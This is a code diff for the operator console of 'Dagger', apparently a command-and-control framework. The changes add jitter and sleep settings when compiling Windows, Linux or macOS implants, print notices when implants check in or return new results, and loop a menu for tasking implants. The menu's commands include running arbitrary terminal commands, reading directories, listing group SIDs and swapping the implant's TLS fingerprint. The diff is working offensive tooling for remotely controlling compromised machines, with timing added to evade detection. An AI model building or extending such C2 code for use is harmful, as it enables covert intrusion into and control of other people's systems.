@@ -39,6 +39,9 @@ type impInfoStruct struct {
 }
 
 func SetIt(result, uuid string) (int32, error) {
+	// This should now set the GotIt to 1
+	// Then do a diff on the current result vs prior result
+	// If the results are different, then display the new one?
 	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
 	if err != nil {
 		log.Fatalf("did not connect : %v", err)
@@ -64,16 +67,29 @@ func SetIt(result, uuid string) (int32, error) {
 
 	preserved_sig := preserved_field.Signature
 
+	prior_result := preserved_field.Result
+
+	preserved_checkin := preserved_field.LastCheckIn
+
+	if preserved_checkin == "" {
+		fmt.Printf("\nNew implant check-in from %s \n", uuid)
+	}
+
+	if prior_result != result {
+		fmt.Printf("\nNew result %s from implant %s that ran command %s \n", result, uuid, preserved_command)
+
+	}
+
 	if err != nil {
 		return 1, err
 	}
 
 	currentTime := time.Now()
-	currentTimeStr := currentTime.Format("2000-01-01 00:00:00")
+	currentTimeStr := currentTime.Format(time.RFC1123)
 
 	res, err := c.SendUpdate(sig_ctx, &pb.UpdateObject{UUID: uuid, Whoami: "", Signature: preserved_sig,
 		Retrieved: 0, Command: preserved_command, LastCheckIn: currentTimeStr, Result: result,
-		GotIt: 0})
+		GotIt: 1})
 
 	code := res.GetCode()
 
@@ -183,8 +199,6 @@ func EnableServers(address, port string) (string, error) {
 		// That info is then fed into the API
 		UUID := r.Header.Get("APPSESSIONID")
 		Res := r.Header.Get("Res")
-		//escaped := strconv.Quote(Res)
-		//fmt.Printf("UUID: %s checking in with result: %s \n", UUID, escaped)
 
 		_, _ = SetIt(Res, UUID)
 
@@ -397,7 +411,7 @@ func UUID_info(UUID string) (impInfo, error) {
 
 }
 
-func build(platform, arch, name, listener string) (uint16, error) {
+func build(platform, arch, name, listener, jitter string, sleep int32) (uint16, error) {
 	fmt.Printf("Attempting to compile... \n")
 	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
 	if err != nil {
@@ -411,7 +425,7 @@ func build(platform, arch, name, listener string) (uint16, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
 
 	defer cancel()
-	res, err := c.StartBuilding(ctx, &pb.BuildRoutine{Platform: platform, Architecture: arch, Name: name, ListenerAddress: listener})
+	res, err := c.StartBuilding(ctx, &pb.BuildRoutine{Platform: platform, Architecture: arch, Name: name, ListenerAddress: listener, Jitter: jitter, Sleep: sleep})
 
 	if err != nil {
 		return 1, err
@@ -436,7 +450,7 @@ func main() {
 	for {
 		var input string
 		for {
-			fmt.Printf("%sDagger controller home menu \n%s", yellow, reset)
+			fmt.Printf("\n%sDagger controller home menu \n%s", yellow, reset)
 			fmt.Printf("Type help for the info menu \n")
 			fmt.Printf("%scontroller > %s", blue, reset)
 			fmt.Scan(&input)
@@ -444,7 +458,8 @@ func main() {
 
 			switch input {
 			case "1":
-				var platform, arch, name, listener string
+				var platform, arch, name, listener, jitter string
+				var sleep int32
 				fmt.Printf("Build menu \n")
 				fmt.Printf("This menu allows you to build a Dagger implant \n")
 				fmt.Printf("Type exit and hit return to leave at any time \n")
@@ -452,14 +467,21 @@ func main() {
 				fmt.Printf("windows amd64 example https://test.culbertreport:8000 \n")
 				fmt.Printf("%sBuilder > %s", red, reset)
 				fmt.Scan(&platform, &arch, &name, &listener)
+				fmt.Printf("%sJitter (High, medium, low) > %s", red, reset)
+				fmt.Scan(&jitter)
+				fmt.Printf("%sSleep (In seconds) > %s", red, reset)
+				fmt.Scan(&sleep)
 				platform = strings.ToLower(platform)
 				arch = strings.ToLower(arch)
 				name = strings.ToLower(name)
 				listener = strings.ToLower(listener)
+				jitter = strings.ToLower(jitter)
 				switch platform {
 				case "windows", "linux", "darwin":
-					res, err := build(platform, arch, name, listener)
-					fmt.Println(res, err)
+					_, err := build(platform, arch, name, listener, jitter, sleep)
+					if err != nil {
+						fmt.Printf("error while building, %e", err)
+					}
 				case "exit":
 					fmt.Printf("Returning to the controller \n")
 
@@ -512,6 +534,8 @@ func main() {
 				fmt.Printf("%sKey > %s", green, reset)
 				fmt.Scan(&key)
 				key = strings.ToLower(key)
+				// Marshal the res into a json struct array then pull out individual elements.
+				// The elements should be UUID and the last check-in time
 				switch key {
 				case "exit":
 					break
@@ -529,6 +553,7 @@ func main() {
 				// Need to set that signature and command
 				// Need to then wait for the listener to update the db that the command was retrieved
 				// Then display the output
+
 				var cmd, uuid string
 				fmt.Printf("This is the menu for interacting with implants \n")
 				fmt.Printf("This requires an implant ID to assign the command to \n")
@@ -540,33 +565,36 @@ func main() {
 				if uuid == "exit" {
 					break
 				}
-				fmt.Println("'pwd' gets the current working directory ")
-				fmt.Println("'gcu' gets the current user by querying the security context ")
-				fmt.Println("'rc' runs a command through the terminal, this can be anything ")
-				fmt.Println("'rd' reads the supplied directory  ")
-				fmt.Println("'terminal' allows you to run terminal commands - NOT OPSEC SAFE ")
-				fmt.Println("'groups' returns the SID of all local groups the user is in ")
-				fmt.Println("'fing' followed by a new TLS fingerprint overwrites the one the implant currently uses ")
-				fmt.Println("Use this with the utmost care. If you put in a fingerprint that is invalid or otherwise doesn't work, you will no longer be able to execute commands")
-				fmt.Printf("%sEnter the command you want executed > %s", red, reset)
-				reader := bufio.NewReader(os.Stdin)
-				cmd, _ = reader.ReadString('\n')
-				cmd = strings.ToLower(cmd)
-				if cmd == "exit" {
-					break
+				for {
+					fmt.Println("'pwd' gets the current working directory ")
+					fmt.Println("'gcu' gets the current user by querying the security context ")
+					fmt.Println("'rc' runs a command through the terminal, this can be anything ")
+					fmt.Println("'rd' reads the supplied directory  ")
+					fmt.Println("'terminal' allows you to run terminal commands - NOT OPSEC SAFE ")
+					fmt.Println("'groups' returns the SID of all local groups the user is in ")
+					fmt.Println("'pid' returns the current process ID ")
+					fmt.Println("'fing' followed by a new TLS fingerprint overwrites the one the implant currently uses ")
+					fmt.Println("Use this with the utmost care. If you put in a fingerprint that is invalid or otherwise doesn't work, you will no longer be able to execute commands")
+					fmt.Println("'exit' brings you back to the main menu ")
+					fmt.Printf("%sEnter the command you want executed > %s", red, reset)
+					reader := bufio.NewReader(os.Stdin)
+					cmd, _ = reader.ReadString('\n')
+					cmd = strings.ToLower(cmd)
+					if cmd == "exit" {
+						break
+					}
+					sig, err := sign(cmd)
+					if err != nil {
+						fmt.Print(err)
+					}
+					res, err := set(cmd, uuid, sig)
+					if res != 0 || err != nil {
+						fmt.Print(err)
+					}
+					if res == 0 {
+						fmt.Printf("Command set \n")
+					}
 				}
-				sig, err := sign(cmd)
-				if err != nil {
-					fmt.Print(err)
-				}
-				res, err := set(cmd, uuid, sig)
-				if res != 0 || err != nil {
-					fmt.Print(err)
-				}
-				if res == 0 {
-					fmt.Printf("Command set \n")
-				}
-
 			case "5":
 				var address, port string
 				fmt.Printf("Listeners \n")
@@ -589,7 +617,7 @@ func main() {
 
 			case "help":
 				fmt.Printf("Help menu \n")
-				fmt.Printf("The interpreter expects 1 - 4 as commands \n")
+				fmt.Printf("The interpreter expects 1 - 5 for menu options \n")
 				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
 				fmt.Printf("2 will bring you to the implant info menu where you can find the last command run and the result \n")
 				fmt.Printf("3 will you to list all implants in the DB \n")
@@ -599,7 +627,7 @@ func main() {
 
 			default:
 				fmt.Printf("Help menu \n")
-				fmt.Printf("The interpreter expects 1 - 4 as commands \n")
+				fmt.Printf("The interpreter expects 1 - 5 for menu options \n")
 				fmt.Printf("1 will bring you to the build menu where you can build an implant \n")
 				fmt.Printf("2 will bring you to the implant info menu where you can find the last command run and the result \n")
 				fmt.Printf("3 will you to list all implants in the DB \n")
